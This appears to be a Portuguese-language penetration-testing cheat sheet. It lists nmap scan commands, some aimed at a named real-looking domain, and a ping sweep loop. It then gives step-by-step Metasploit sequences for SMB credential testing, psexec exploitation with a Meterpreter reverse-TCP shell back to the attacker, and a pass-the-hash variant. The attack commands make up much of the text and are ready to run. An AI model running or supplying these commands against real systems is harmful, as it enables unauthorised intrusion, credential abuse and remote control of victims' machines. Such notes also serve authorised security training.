-----*FingerPrint*-----

Varregura de um range em uma porta específica
nmap -sS -vvv -p 80 192.168.0.0/24

Alvos passados via arquivo texto
nmap -sS -vvv -p 80 -iL nmap_subnet_file

As varreduras do tipo TCP são as mais escandalosas, porém são as que trazem mais informações. Eliminando falsos
positivos que por ventura possam ter sido identificados.
nmap -sT -vvv -p 80 192.168.0.0/24

As varreduras do tipo SYN são extremamente silenciosas. É preciso tomar cuidado com sistemas antigos, pois podem se
comportar de forma inesperada pelo fato do cliente não encerrar a conexão.
nmap -sS -vvv -p 80 192.168.0.0/24

Varreduras do tipo ACK são raramente utilizadas, porém são ótimas para fazer mapeamento de regras de firewall.
Alguns sistemas retornam informaçõesa adicionais quando são alvos de varreduras ACK. É interessante utilizar um tcpdump
para analisar as respostas.
nmap -sA -vvv -p 80 192.168.0.0/24

Varreduras UDP são extremamente lentas e inconclusivas.
nmap -sU -vvv -p 80 192.168.0.0/24

Varreduras combinadas
nmap -sS -sU -vvv -p U:161,139 T:8080,21 192.168.0.0/24

O comando abaixo gera um arquivo "grepável"
nmap -sS -p 80 t2tagency.com -oG t2tagency.com.gnmap

Analisa o arquivo gerado anteriormente e gera lista contendo somente o IP dos hosts alvos
cat t2tagency.com.gnmap | grep 80/open/tcp | cut -d" " -f2 >> http_hosts_list

Ataque para testar credencias com lista anteriormente gerada
msfconsole #Inicia o metasploit
use auxiliary/scanner/smb/smb_login #Seleciona o módulo que será utilizado
set SMBUser administrator #Informa o usuário a ser usado
set SMBPass test #Senha do usuario
set SMBDomain Workgroup #Configura o grupo de trabalho
set RHOSTS file:/root/smb_hosts_list #Lista contendo os alvos
run #Executa o exploit

Ataque para explorar a vulnerabilidade e retornar um shell ao atacante
msfconsole #Inicia o metasploit
use exploit/windows/smb/psexec #Seleciona o módulo que será utilizado
set SMBUser administrator #Informa o usuário a ser usado
set SMBPass test #Senha do usuario
set SMBDomain Workgroup #Configura o grupo de trabalho
set payload windows/meterpreter/reverse_tcp #Configura o payload que sera utilizado
set RHOST 192.168.195.112 #Define o alvo
set LPORT 443 #Define a porta que o atacante escutará
exploit -j #Lança o ataque colocando a sessão em background

session -i <numero da sessao> #Abre uma sessao previamente estabelecida

PtH (pass-the-hash) - Tecnica utilizada que usa fraqueza do Windows, nesse caso não é necessário quebrar a senha, basta
passar o hash da senha como parametro que o sistema permite o acesso.

Ataque para explorar a vulnerabilidade e retornar um shell ao atacante (utilizando a técnica de PtH)
msfconsole #Inicia o metasploit
use exploit/windows/smb/psexec #Seleciona o módulo que será utilizado
set SMBUser administrator #Informa o usuário a ser usado
set SMBPass 09183AB3289131E23019F9123:0C1130FA12370A084102EE12309 #Hash da senha
set SMBDomain Workgroup #Configura o grupo de trabalho
set payload windows/meterpreter/reverse_tcp #Configura o payload que sera utilizado
set RHOST 192.168.195.112 #Define o alvo
set LPORT 443 #Define a porta que o atacante escutará
exploit -j #Lança o ataque colocando a sessão em background

O comando abaixo gera um arquivo XML
nmap -sS -p 80 t2tagency.com -oX t2tagency.com.xml

Os scripts do nmap ficam localizados no seguinte caminho
/usr/share/nmap/scripts

Executa todos os scripts padrão do nmap
nmap --script default t2tagency.com

Executa todos os scripts padrão ou seguros que não iniciam com http
nmap --script "(default or safe) and not http-*" t2tagency.com

Verifica quais gateway respondem na rede atraves do ping
for i in `seq 1 255`; do ping -c 1 10.0.$i.2 | tr \\n ' ' | awk '/1 receive/ {print $2}'; done

Biblioteca para varredura nmap atraves de scripts Python3
pip install python-nmap

----*Ataque de credencias*----
